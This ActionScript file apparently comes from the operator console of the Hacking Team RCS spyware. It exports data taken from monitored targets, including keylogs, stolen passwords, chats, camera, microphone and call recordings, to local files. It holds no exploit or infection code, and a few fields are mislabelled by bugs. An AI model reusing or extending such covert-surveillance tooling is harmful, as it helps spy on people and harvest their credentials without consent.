package it.ht.rcs.console.operations.view.evidences
{
  import flash.events.Event;
  import flash.events.EventDispatcher;
  import flash.events.IEventDispatcher;
  import flash.events.IOErrorEvent;
  import flash.events.ProgressEvent;
  import flash.events.SecurityErrorEvent;
  import flash.filesystem.File;
  import flash.filesystem.FileMode;
  import flash.filesystem.FileStream;
  import flash.net.URLRequest;
  import flash.net.URLStream;
  import flash.utils.ByteArray;
  
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.evidence.controller.EvidenceManager;
  import it.ht.rcs.console.evidence.model.Evidence;
  
  import mx.collections.ArrayCollection;
  
  public class EvidenceFileExporter extends EventDispatcher
  {
    private var directory:File;
    private var file:File;
    private var extension:String;
    private var request:URLRequest;
    private var stream:URLStream;
    private var evidences:Vector.<Object>;
    private var currentEvidence:Evidence;
    
    public var currentIndex:int=0;
    public var total:int=0;
    public var bytesLoaded:Number;
    public var bytesTotal:Number
    
    public static const EXPORT_START:String="exportStart";
    public static const EXPORT_PROGRESS:String="exportProgress";
    public static const EXPORT_COMPLETE:String="exportComplete";
    public static const EXPORT_END:String="exportEnd";

    
    public function export(list:Vector.<Object>):void
    {
      evidences=list;
      total=evidences.length;
      directory=File.desktopDirectory;// Another one??
      directory.browseForDirectory("Choose a directory");
      //file.addEventListener(Event.CANCEL, onDirectoryCancel)
      directory.addEventListener(Event.SELECT, onDirectorySelected)
      
    }
    
    private function onDirectorySelected(e:Event):void
    {
      trace("directory selected");
      trace(directory.nativePath);
      startQueue()
    }
    
    private function startQueue():void
    {
        dispatchEvent(new Event(EXPORT_START));
        currentIndex=0;
        currentEvidence=evidences[currentIndex] as Evidence;
        exportFile(currentEvidence)
    }
    private function next():void
    {
      currentIndex++;
      if(currentIndex<evidences.length)
      {
        currentEvidence=evidences[currentIndex] as Evidence;
        exportFile(currentEvidence);
      }
      else
      {
        trace("queue completed")
        dispatchEvent(new Event(EXPORT_END));
      }
    }
    
    private function exportFile(evidence:Evidence):void
    {
      switch(evidence.type)
      {
        case "screenshot":
          exportImage(evidence);
          break;
        
        case "screenshot":
          exportImage(evidence);
          break;
        
        case "mouse":
          exportImage(evidence);
          break;
        
        case "camera":
          exportImage(evidence);
          break;
        
        case "call":
          exportSound(evidence);
          break;
        
        case "mic":
          exportSound(evidence);
          break;
        
        case "addressbook":
          exportText(evidence);
          break;
        
        case "application":
          exportText(evidence);
          break;
        
        case "calendar":
          exportText(evidence);
          break;
        
        case "chat":
          exportText(evidence);
          break;
        
        case "clipboard":
          exportText(evidence);
          break;
        
        case "device":
          exportText(evidence);
          break;
        
        case "keylog":
          exportText(evidence);
          break;
        
        case "message":
          exportMessage(evidence);
          break;
        
        case "password":
          exportText(evidence);
          break;
        
        case "position":
          exportText(evidence);
          break;
        
        case "print":
          exportText(evidence);
          break;
        
        case "url":
          exportText(evidence);
          break;
      }
    
    }
    
    private function onDownloadProgress(e:ProgressEvent):void
    {
      var perc:int=int((e.bytesLoaded/e.bytesTotal)*100);
      trace("downloading file "+perc)
      bytesLoaded=e.bytesLoaded
      bytesTotal=e.bytesTotal
      dispatchEvent(new Event(EXPORT_PROGRESS));
    }
    
    private function onDownloadError(e:*):void
    {
     trace("Error downloading file");
    }
    
    private function onFileDownloaded(e:Event):void
    {
      stream.removeEventListener(Event.COMPLETE, onFileDownloaded);
      stream.removeEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.removeEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.removeEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      var fileData:ByteArray=new ByteArray();
      stream.readBytes(fileData, 0, stream.bytesAvailable);
      var fileStream:FileStream=new FileStream();
      fileStream.open(file, FileMode.WRITE);
      fileStream.writeBytes(fileData, 0, fileData.length);
      fileStream.close();
      dispatchEvent(new Event(EXPORT_COMPLETE));
      next()
      
    }
    private function exportText(evidence:Evidence):void
    {
      trace("export text")
      bytesLoaded=0
      bytesTotal=0
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      extension="txt"
      var fileName:String=evidence._id + encodeURIComponent(target) + "." + extension;
      file=new File(directory.nativePath +"/"+fileName);//add 
      var content:String=getInfo(currentEvidence)
      var fileStream:FileStream=new FileStream();
      fileStream.open(file, FileMode.WRITE);
      fileStream.writeUTFBytes(content);
      fileStream.close();
      dispatchEvent(new Event(EXPORT_COMPLETE));
      next();
      
    }
    
    private function exportImage(evidence:Evidence):void
    {
      trace("export image");
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      extension="jpg";
      var fileName:String=evidence.data._grid + encodeURIComponent(target) + "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);//add filename
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
      
    }
    
    private function exportMessage(evidence:Evidence):void
    {
      trace("export image");
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      extension="eml";
      var fileName:String=evidence.data._grid + encodeURIComponent(target) + "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);//add filename
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
      
    }
    
    private function exportSound(evidence:Evidence):void
    {
      trace("export sound")
      var target:String=EvidenceManager.instance.evidenceFilter.target;
      var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
      extension="mp3";
      var fileName:String=evidence.data._grid + encodeURIComponent(target) + "." + extension;
      request=new URLRequest(url);
      stream=new URLStream();
      file=new File(directory.nativePath +"/"+fileName);//add filename
      stream.addEventListener(Event.COMPLETE, onFileDownloaded);
      stream.addEventListener(ProgressEvent.PROGRESS, onDownloadProgress);
      stream.addEventListener(IOErrorEvent.IO_ERROR,onDownloadError);
      stream.addEventListener(SecurityErrorEvent.SECURITY_ERROR ,onDownloadError)
      stream.load(request);
    }
    
   
    
    private function setFileName(evidence:Evidence):String //TODO
    {
      var name:String="";
      return name;
    }
    
    private function getInfo(evidence:Evidence):String
    {
      var info:String;
      switch(evidence.type)
      {
        case "addressbook":
          info="Addressbook: "+"\n\n";
          info="Name: "+evidence.data.name+"\n";
          info+="Contact: "+evidence.data.contact+"\n";
          info+="Info: "+evidence.data.info;
          break;
        
        case "application":
          info="Application: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Action: "+evidence.data.action+"\n";
          info+="Description: "+evidence.data.desc;
          break;
        
        case "calendar":
          info="Calendar: "+"\n\n";
          info+="Begin: "+evidence.data.begin+"\n";
          info+="End: "+evidence.data.end+"\n";
          info+="Event: "+evidence.data.event+"\n";
          info+="Info: "+evidence.data.info+"\n";
          break;
        
        case "chat":
          info="Chat: "+"\n\n";
          info+="Topic: "+evidence.data.topic+"\n";
          info+="Peer: "+evidence.data.peer+"\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "clipboard":
          info="Clipboard: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Window: "+evidence.data.window+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "device":
          info="Device: "+"\n\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "keylog":
          info="Keylog: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Window: "+evidence.data.window+"\n";
          info+="Content: "+evidence.data.content+"\n";
          break;
        
        case "password":
          info="Password: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Service: "+evidence.data.service+"\n";
          info+="User: "+evidence.data.user+"\n";
          info+="Pass: "+evidence.data.pass+"\n";
          break;
        
        case "position"://TODO
          info="Position: "+"\n\n";
          info+="Program: "+evidence.data.program+"\n";
          info+="Service: "+evidence.data.service+"\n";
          info+="User: "+evidence.data.user+"\n";
          info+="Pass: "+evidence.data.pass+"\n";
          break;
        
        case "print":
          info="Print: "+"\n\n";
          info+="Spool: "+evidence.data.spool+"\n";
          break;
        
        case "url":
          info="URL: "+"\n\n";
          info+="URL: "+evidence.data.url+"\n"; //TODO 
          break;
        
      }
      return info;
    }
  }
}